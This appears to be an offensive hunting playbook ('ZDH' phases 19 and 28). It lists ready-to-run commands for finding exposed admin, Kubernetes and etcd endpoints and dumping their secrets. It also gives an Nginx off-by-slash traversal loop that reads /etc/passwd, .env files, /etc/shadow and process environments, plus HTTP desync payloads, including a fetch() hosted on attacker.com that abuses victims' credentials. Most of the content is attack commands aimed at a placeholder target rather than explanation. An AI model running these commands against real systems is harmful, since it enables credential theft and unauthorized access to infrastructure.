# ZDH Phase 19, 28: Admin Panel Discovery + Infrastructure Path Attacks

## Phase 19 - Internal Admin Panel Discovery

```bash
# Kubernetes health (no auth, almost always public)
/healthz, /readyz, /livez, /health

# Spring Boot actuator (403 = EXISTS even if blocked)
/actuator, /actuator/env, /actuator/httptrace, /actuator/mappings
/actuator/beans, /actuator/logfile, /actuator/metrics, /actuator/info

# Admin setup flows (try BEFORE login - often unauthenticated)
/auth/verify-system-admin-setup   # setup state = architecture leak
/auth/create-system-admin-auth    # 400 = accepts input (not 403 = auth)
/auth/forgot-password-auth        # 417 = SMTP not configured

# GraphQL introspection
POST /graphql  {"query": "{__schema{queryType{name}}}"}

# OpenAPI / Swagger (full API schema without auth)
/v2/api-docs, /v3/api-docs, /swagger-ui.html, /openapi.json

# Kubernetes API server (if found exposed)
curl https://<target>:6443/api/v1/namespaces/  # unauthenticated = Critical
curl https://<target>:8443/api/v1/secrets      # K8s secrets = all credentials
curl http://<target>:8080/api/v1/             # insecure port (rare but exists)

# Kubernetes dashboard
/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy/

# etcd (K8s data store - all secrets unencrypted if exposed)
curl http://<target>:2379/v2/keys/?recursive=true  # all K8s secrets in plaintext

# Monitoring stacks
/grafana, /kibana, /_cat/indices, /_cluster/health, /metrics, /prometheus

# Enterprise WAF response classification:
# JSON 40x/50x = app processes request = past WAF = FINDING
# HTML 403 = WAF block
# {"completed":true} = setup state = FINDING
# {"message":"SMTP is not enabled"} = misconfiguration = FINDING
```

## Phase 28 - Infrastructure Path Attacks

### Nginx Alias Traversal - Off-by-Slash (David Hamann / Bayot)
```bash
# Vulnerable Nginx config (location has no trailing slash, alias does):
# location /files { alias /data/uploads/; }
# GET /files../etc/passwd -> /data/etc/passwd -> /etc/passwd

# Test systematically:
for prefix in static assets files media uploads images js css; do
  result=$(curl -s "https://<target>/${prefix}../etc/passwd" 2>/dev/null)
  if echo "$result" | grep -q "root:"; then
    echo "VULNERABLE: /${prefix}../etc/passwd"
  fi
done

# Target high-value files:
curl "https://<target>/static../app/.env"
curl "https://<target>/assets../app/config.py"
curl "https://<target>/media../app/settings.py"
curl "https://<target>/uploads../proc/self/environ"
curl "https://<target>/files../etc/shadow"

# With URL encoding (if direct path blocked):
curl "https://<target>/static%2e%2e/etc/passwd"
curl "https://<target>/static%252e%252e/etc/passwd"  # double encoded

# Automated: nginxpwner tool
python3 nginxpwner.py -u https://<target> -w wordlists/static-prefixes.txt
```

### HTTP Desync - CL.0 & Browser-Powered (James Kettle, Black Hat 2022)
```
# CL.0 detection (pause-based - works on single servers, no proxy needed):
# Send request with Content-Length but pause before body:
POST /api/endpoint HTTP/1.1
Host: target.com
Content-Length: 34
Connection: keep-alive

[PAUSE 6 SECONDS - do not send body]

# If server returns response WITHOUT waiting for body = CL.0 confirmed
# Body of first request becomes prefix of second request

# Browser-Powered Desync (Client-Side Desync - no proxy required):
# Host on attacker.com, victim visits:
fetch('https://vulnerable.com/api/endpoint', {
  method: 'POST',
  body: 'GET /admin HTTP/1.1\r\nHost: vulnerable.com\r\n\r\n',
  mode: 'no-cors',
  credentials: 'include',
  keepalive: true  # forces reuse of connection
});
# Next request from victim's browser to vulnerable.com is prefixed with /admin

# H2.CL (HTTP/2 to HTTP/1.1 downgrade):
# Burp Suite -> Repeater -> HTTP/2
:method: POST
:path: /api
content-length: 0

GET /admin HTTP/1.1
Host: target.com
Content-Length: 5

x=1
# Timing >6s = desync confirmed
```

**Signal:** `emit_signal VULN_CONFIRMED "Nginx alias traversal: /static../app/.env -> creds exposed" "main/zerodayhunt" 0.95`
